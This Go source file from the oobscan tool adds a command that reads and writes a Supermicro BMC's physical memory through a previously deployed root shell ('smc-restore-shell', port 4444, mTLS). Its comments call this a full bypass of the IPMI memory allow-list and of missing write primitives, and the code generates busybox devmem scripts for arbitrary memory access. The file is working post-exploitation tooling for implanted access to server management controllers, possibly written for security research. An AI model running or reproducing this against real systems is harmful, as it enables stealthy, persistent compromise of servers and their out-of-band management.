package cmd

import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
	"github.com/spf13/cobra"
)

// memViaShell reports whether commandArgs is a `mem read|write ... via=shell`
// invocation, which reaches the BMC's /dev/mem through the deployed root shell and
// therefore needs NO IPMI session at all.
func memViaShell(args []string) bool {
	if len(args) < 2 || strings.ToLower(args[0]) != "mem" {
		return false
	}
	if sub := strings.ToLower(args[1]); sub != "read" && sub != "write" {
		return false
	}
	for _, a := range args[2:] {
		if la := strings.ToLower(a); la == "via=shell" || la == "source=shell" {
			return true
		}
	}
	return false
}

// runIPMIMemViaShell executes a `mem read|write ... via=shell` command against host
// WITHOUT opening an IPMI session (the transport is the smc-restore-shell). Only
// numeric physical addresses are accepted here (no profile is loaded to resolve
// region names). This is what keeps the allow-list bypass usable when IPMI is
// wedged or has no memory primitive at all (X10 fw 3.53).
func runIPMIMemViaShell(host string, args []string) (any, error) {
	o, err := parseIPMIMemArgs(args[2:])
	if err != nil {
		return nil, err
	}
	if len(o.pos) < 1 {
		return nil, fmt.Errorf("usage: mem %s <phys-addr> ... via=shell", strings.ToLower(args[1]))
	}
	addr, err := parseShellAddr(o.pos[0])
	if err != nil {
		return nil, fmt.Errorf("via=shell needs a numeric physical address (got %q): %w", o.pos[0], err)
	}
	switch strings.ToLower(args[1]) {
	case "read":
		if len(o.pos) < 2 {
			return nil, fmt.Errorf("usage: mem read <phys-addr> <len> via=shell")
		}
		ln, lerr := parseShellLen(o.pos[1])
		if lerr != nil {
			return nil, lerr
		}
		if o.space == ipmi.MemSpaceHost {
			return ipmiMemHostRead(host, addr, ln, o)
		}
		return ipmiMemShellRead(host, uint32(addr), ln, o)
	case "write":
		var data []byte
		switch {
		case o.inFile != "":
			if data, err = os.ReadFile(o.inFile); err != nil {
				return nil, err
			}
		case len(o.pos) >= 2:
			if data, err = parseMemWriteBytes(o.pos[1:]); err != nil {
				return nil, err
			}
		default:
			return nil, fmt.Errorf("usage: mem write <phys-addr> <hexbytes|in=FILE> via=shell apply")
		}
		if o.space == ipmi.MemSpaceHost {
			if o.espi {
				return ipmiMemHostWriteESPI(host, addr, data, o)
			}
			return ipmiMemHostWrite(host, addr, data, o)
		}
		return ipmiMemShellWrite(host, uint32(addr), data, o)
	}
	return nil, fmt.Errorf("via=shell supports mem read/write only")
}

// printViaShellResult renders a via=shell result without any IPMI session context.
func printViaShellResult(cmd *cobra.Command, host string, result any) error {
	out := cmd.OutOrStdout()
	switch normalizeIPMIFormat(ipmiOutputFormat) {
	case "json", "jsonl":
		b, err := json.Marshal(map[string]any{"host": host, "transport": "smc-restore-shell", "result": result})
		if err != nil {
			return err
		}
		_, err = fmt.Fprintln(out, string(b))
		return err
	}
	return printIPMIResultTable(out, host, ipmi.AuthFlow{}, nil, "", result)
}

func parseShellAddr(s string) (uint64, error) {
	s = strings.TrimSpace(s)
	base := 10
	if strings.HasPrefix(s, "0x") || strings.HasPrefix(s, "0X") {
		base, s = 16, s[2:]
	}
	return strconv.ParseUint(s, base, 64)
}

func parseShellLen(s string) (int, error) {
	s = strings.ToLower(strings.TrimSpace(s))
	mult := 1
	switch {
	case strings.HasSuffix(s, "k"):
		mult, s = 1024, s[:len(s)-1]
	case strings.HasSuffix(s, "m"):
		mult, s = 1024*1024, s[:len(s)-1]
	}
	v, err := parseShellAddr(s)
	if err != nil {
		return 0, err
	}
	return int(v) * mult, nil
}

// smcShellCertAndPort loads the pinned smc-restore-shell client identity and the
// service port used by `mem ... via=shell`.
func smcShellCertAndPort() (*ipmi.SMCShellClientCert, int, error) {
	cert, err := readSMCShellClientCert(resolveSMCShellCertPath(smcCertPath))
	if err != nil {
		return nil, 0, fmt.Errorf("via=shell: %w (deploy the service first with 'oobscan smc-restore-shell ... --apply')", err)
	}
	port := smcShellPort
	if port == 0 {
		port = 4444
	}
	return cert, port, nil
}

// ipmiMemShellRead reads BMC physical memory through the deployed smc-restore-shell
// root shell + /dev/mem (busybox devmem), a full bypass of the 0x30/0x70/0xC0 page
// allowlist and of a build whose IPMI /dev/mem open fails. 4-byte units; the whole
// range is read over one TLS connection.
func ipmiMemShellRead(host string, addr uint32, length int, o *ipmiMemOpts) (any, error) {
	_ = o
	if length <= 0 {
		return nil, fmt.Errorf("via=shell: a length is required")
	}
	cert, port, err := smcShellCertAndPort()
	if err != nil {
		return nil, err
	}
	start := addr &^ 3
	off := int(addr - start)
	count := (off + length + 3) / 4
	script := fmt.Sprintf("i=0; while [ $i -lt %d ]; do devmem $(printf '0x%%x' $((%d + i*4))) 32; i=$((i+1)); done", count, start)
	out, eerr := ipmi.SMCShellExec(host, port, cert, script, 180*time.Second)
	if eerr != nil {
		return nil, eerr
	}
	words := parseDevmemWords(out)
	if len(words) < count {
		return nil, fmt.Errorf("via=shell: read %d of %d words (is the range backed? shell said: %q)", len(words), count, smcShellClip(out, 200))
	}
	raw := make([]byte, 0, count*4)
	for _, w := range words[:count] {
		raw = append(raw, byte(w), byte(w>>8), byte(w>>16), byte(w>>24)) // devmem word -> little-endian memory bytes
	}
	data := raw[off : off+length]
	return map[string]any{
		"action":    "mem read",
		"via":       "shell",
		"transport": "smc-restore-shell + /dev/mem (devmem)",
		"address":   fmt.Sprintf("0x%08x", addr),
		"length":    length,
		"note":      "allow-list bypass: read the BMC's /dev/mem over the mTLS root shell",
		"hexdump":   memHexdump(data, uint64(addr)),
	}, nil
}

// ipmiMemShellWrite writes BMC physical memory through the root shell + /dev/mem, a
// full bypass of a firmware with no 0xC1 write primitive (production H13). Staged
// until 'apply'; 'verify' re-reads and compares each word.
func ipmiMemShellWrite(host string, addr uint32, data []byte, o *ipmiMemOpts) (any, error) {
	if len(data) == 0 || len(data)%4 != 0 {
		return nil, fmt.Errorf("via=shell write needs a whole number of 4-byte words")
	}
	if addr%4 != 0 {
		return nil, fmt.Errorf("via=shell write needs a 4-byte-aligned address")
	}
	words := len(data) / 4
	var ws strings.Builder
	for i := 0; i < len(data); i += 4 {
		w := uint32(data[i]) | uint32(data[i+1])<<8 | uint32(data[i+2])<<16 | uint32(data[i+3])<<24
		fmt.Fprintf(&ws, "devmem 0x%08x 32 0x%08x\n", addr+uint32(i), w)
	}
	if !o.apply {
		return map[string]any{
			"action": "mem write", "via": "shell", "applied": false,
			"address": fmt.Sprintf("0x%08x", addr), "length": len(data),
			"note":      "staged only: add the bare token 'apply' to write /dev/mem over the root shell",
			"wouldSend": strings.TrimSpace(ws.String()),
		}, nil
	}
	cert, port, err := smcShellCertAndPort()
	if err != nil {
		return nil, err
	}
	script := ws.String()
	if o.verify {
		script += fmt.Sprintf("echo __VERIFY__\ni=0; while [ $i -lt %d ]; do devmem $(printf '0x%%x' $((%d + i*4))) 32; i=$((i+1)); done", words, addr)
	}
	out, eerr := ipmi.SMCShellExec(host, port, cert, script, 180*time.Second)
	if eerr != nil {
		return nil, eerr
	}
	res := map[string]any{
		"action": "mem write", "via": "shell", "applied": true,
		"transport": "smc-restore-shell + /dev/mem (devmem)",
		"address":   fmt.Sprintf("0x%08x", addr), "length": len(data),
		"note": "allow-list/no-write bypass: wrote the BMC's /dev/mem over the mTLS root shell",
	}
	if o.verify {
		vpart := out
		if i := strings.Index(out, "__VERIFY__"); i >= 0 {
			vpart = out[i+len("__VERIFY__"):]
		}
		rb := parseDevmemWords(vpart)
		mism := 0
		for i := 0; i < words; i++ {
			want := uint32(data[i*4]) | uint32(data[i*4+1])<<8 | uint32(data[i*4+2])<<16 | uint32(data[i*4+3])<<24
			if i >= len(rb) || rb[i] != want {
				mism++
			}
		}
		res["verified"] = mism == 0
		res["mismatches"] = mism
	}
	return res, nil
}

// parseDevmemWords extracts each `0xXXXXXXXX` word from devmem output, in order.
func parseDevmemWords(out string) []uint32 {
	var words []uint32
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if len(line) < 3 || line[0] != '0' || (line[1] != 'x' && line[1] != 'X') {
			continue
		}
		v, err := strconv.ParseUint(line[2:], 16, 32)
		if err != nil {
			continue
		}
		words = append(words, uint32(v))
	}
	return words
}

func smcShellClip(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) > n {
		return s[:n] + "..."
	}
	return s
}
